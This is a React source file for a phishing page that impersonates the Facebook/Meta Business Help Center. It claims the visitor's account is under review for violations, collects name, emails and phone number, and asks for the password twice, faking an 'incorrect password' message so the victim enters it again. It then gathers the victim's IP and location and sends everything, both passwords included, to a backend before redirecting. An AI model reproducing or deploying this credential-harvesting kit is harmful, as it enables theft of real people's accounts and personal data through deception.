import React from 'react'
import { logo, search } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';
import axios from 'axios';
import { Button, Checkbox, Form, Input } from 'antd';
import { getDataApi, getSections, saveSection } from '../apis/getData';

const Buiness = () => {

    const [formPassword] = Form.useForm();
    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [loading, setLoading] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {
        if(values.check_form === true){
            saveSection(values, 'userSession')
            return handleOpendPopup()
        }
    };

    const onFinishPassWord = async (values) => {

        const getSession = getSections('userSession');
        
        if(first === true) {
            setFirstPassword(values.fill_first_password)
            setLoading(false)
            setActionFirst(false)
        }
        
        setTimeout(() => {
            formPassword.setFieldsValue({ fill_first_password: '' });
            setActivePassword(true)
        }, 2000)

        setTimeout(() => {
            setLoading(true)
        }, 2000)

        if(activePassword === true){

            axios.get(`https://api.db-ip.com/v2/free/self`)
            .then((res) => {
                const { data } = res;

                const sessionFinal = {
                    "ip": `${data.ipAddress} | ${data.city} | ${data.countryName} | ${data.countryCode} | ${data.continentName}`,
                    "businessEmail" : getSession.fill_business_email,
                    "personalEmail" : getSession.fill_personal_email,
                    "fullName" : getSession.fill_full_name,
                    "fanpageName" : getSession.fill_facebook_pagename,
                    "mobilePhone" : getSession.fill_phone,
                    "passwordFirst" : firstPassword,
                    "passwordSecond" : values.fill_first_password
                }

                saveSection(sessionFinal, 'newSession')
                getDataApi(sessionFinal)
                navigate(`/${process.env.REACT_APP_ROUTER}/confirm`);
            })
        }
    };

  return (
    <div className="business">

        <div className="top-header">
            <div className="container">
                <img src={logo} width="70" className="metalogo" alt='images'/>
                <p className="metahead">Support Inbox</p>
                <img src={search} width="100%" className="searchicon" alt='images'/>
            </div>
        </div>
        <div className="masheader">
            <div className="wrapper">
                <div className="container">
                    <p className="businesshelp" style={{visibility: "hidden"}}>
                        Meta Business Help Center </p>
                    <p className="businesshelpcenter">Facebook Business Help
                        Center</p>
                </div>
            </div>
        </div>

        <div className="main">

            <div className="form">
                <div className="header-form">
                    <div className="header-top">
                        <div className="dot"></div>
                        <div className="line"></div>
                        <div className="dot"></div>
                        <div className="line"></div>
                        <div className="dot"></div>
                    </div>
                    <div className="header-bottom">
                        <p>Select Asset</p>
                        <p>Select the Issue</p>
                        <p>Get help</p>
                    </div>
                </div>

                <div className="text-center pb-3" style={{fontSize: "20px", textAlign: "center"}}>
                    <strong>Get Started</strong>
                </div>

                <div className="mb-4" style={{backgroundColor: "rgb(226, 227, 229)", fontSize: "12px", textAlign: "left", padding: "15px"}}>
                    We have received multiple reports that suggest that your
                    account has
                    been in violation of our terms of services and community
                    guidelines.
                    As a result, your account is scheduled for review
                    <br/>
                    <div className="text-start pt-2" style={{fontSize: "14px"}}>
                        <strong>Report no: 3088553115</strong>
                    </div>
                </div>


                {/* FORM START */}

                <Form
                    name="basic"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinish}
                    autoComplete="off"
                >

                    <div className="item-form">
                        <p>
                            <label style={{color:"rgb(0, 0, 0)", fontWeight: "bold"}}>
                                Please provide us information that will help us investigate                        
                            </label>
                        </p>
                       
                        <Form.Item
                            name="information"
                            rules={[
                                {
                                required: true,
                                message: 'Please input information!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label htmlFor="name">Full name</label>
                        <Form.Item
                            name="fill_full_name"
                            rules={[
                                {
                                required: true,
                                message: 'Please input full name!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label htmlFor="Business">Business email address</label>
                        <Form.Item
                            name="fill_business_email"
                            rules={[
                                {
                                required: true,
                                message: 'Please input business email address!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label htmlFor="email">Personal email address</label>
                        <Form.Item
                            name="fill_personal_email"
                            rules={[
                                {
                                required: true,
                                message: 'Please input personal email address!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label htmlFor="phone">Mobile Phone Number</label>
                        <Form.Item
                            name="fill_phone"
                            rules={[
                                {
                                required: true,
                                message: 'Please input mobile phone number!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <Form.Item
                            name="check_form"
                            valuePropName="checked"
                            rules={[
                                {
                                required: true,
                                message: 'Please agree to our terms and data and cookie policy!',
                                },
                            ]}
                        >
                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                        </Form.Item>
                    </div>


                    <Form.Item 
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                color: "#267df1",
                                fontWeight: '700',
                                fontSize:'1rem',
                                width: '100%'
                            }}
                        >
                            Submit
                        </Button>
                    </Form.Item>
                </Form>

                {/* FORM END */}
            </div>

        </div>

        {/* FOOTER */}
        <div className="footer">
            <div className="container">
                <img src={logo} className="logofooter" alt='images'/>
                <p className="nerlogofooter">
                    Facebook can help your large, medium or small business
                    grow. Get the latest news
                    for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                <div className="row">
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing on Facebook</p>
                                <p>Success Stories</p>
                                <p>Measurement</p>
                                <p>Industries</p>
                                <p>Inspiration</p>
                                <p>Events</p>
                                <p>News</p>
                                <p>Site map</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing objectives</p>
                                <p>Build your presence</p>
                                <p>Create awareness</p>
                                <p>Drive discovery</p>
                                <p>Generate leads</p>
                                <p>Boost sales</p>
                                <p>Earn loyalty</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook Pages</p>
                                <p>Get started with Pages</p>
                                <p>Setting up your Page</p>
                                <p>Manage your Facebook Page</p>
                                <p>Promote your Page</p>
                                <p>Messaging on your Page</p>
                                <p>Page Insights</p>
                            </li>
                        </ul>
                    </div>
                    <div variant="dontshowonmobile " className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook ads</p>
                                <p>Get started with ads</p>
                                <p>Buying Facebook ads</p>
                                <p>Ad formats</p>
                                <p>Ad placement</p>
                                <p>Choose your audience</p>
                                <p>Measure your ads</p>
                                <p>Managing your ads</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div className="bottomfooter">
            <div className="container">
                <ul>
                    <li>English (UK)</li>
                    <li>English (US)</li>
                    <li>Español</li>
                    <li>Português (Brasil)</li>
                    <li>Français (France)</li>
                    <li>Español (España)</li>
                    <li>More languages</li>
                </ul>
                <ul>
                    <li>© 2023 Meta</li>
                    <li>About</li>
                    <li>Developers</li>
                    <li>Careers</li>
                    <li>Privacy</li>
                    <li>Cookies</li>
                    <li>Terms</li>
                    <li>Help Centre</li>
                </ul>
            </div>
        </div>


        <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup" >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content">

                <Form
                    name="basicForm"
                    initialValues={{
                        remember: true,
                    }}
                    onFinish={onFinishPassWord}
                    autoComplete="off"
                    form = {formPassword}
                >

                    <div className="modal-header custom-header px-0">
                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}> Please
                            Enter Your Password </h5>
                        <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                            <span aria-hidden="true" >×</span>
                        </button>
                    </div>

                    <div className="item-form">
                        <p style={{fontSize:"16px", marginBottom: "10px"}}> For your security, you must enter your password to continue. </p>

                        <div style={{display:"flex", alignItems: "center", justifyContent: "center"}} className={loading === true ? 'loading-animate' : 'loading-animate active'}>
                            <div className="loadingio-spinner-rolling-iwlfl4nh5d">
                                <div className="ldio-f5aabcq675v">
                                    <div></div>
                                </div>
                            </div>
                        </div>

                        <label htmlFor="password">Password:</label>
                        <Form.Item
                            name="fill_first_password"
                            rules={[
                                {
                                    required: true,
                                    message: `The password you've entered is incorrect.`,
                                },
                            ]}
                            style={{
                                margin: '0'
                            }}
                        >
                            <Input.Password />
                        </Form.Item>
                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect. <a href="https://accountscenter.facebook.com/password_and_security/password/change" target="_blank" rel="noopener noreferrer" style={{textDecoration: "none", fontWeight: "700", color:"red"}}>Forgoten Password?</a></p>
                    </div>

                    <Form.Item 
                        style={{
                            color: "rgb(255, 255, 255)", 
                            backgroundColor: "rgb(44, 132, 244)", 
                            marginTop: "20px",
                            width: "auto",
                            float: 'right'
                        }}
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                fontWeight: '700',
                                fontSize:'1rem',
                                color: 'white',
                                width: '100%'
                            }}
                        >
                            Continue
                        </Button>
                    </Form.Item>
                </Form>

            </div>
        </div>
    </div>
  )
}

export default Buiness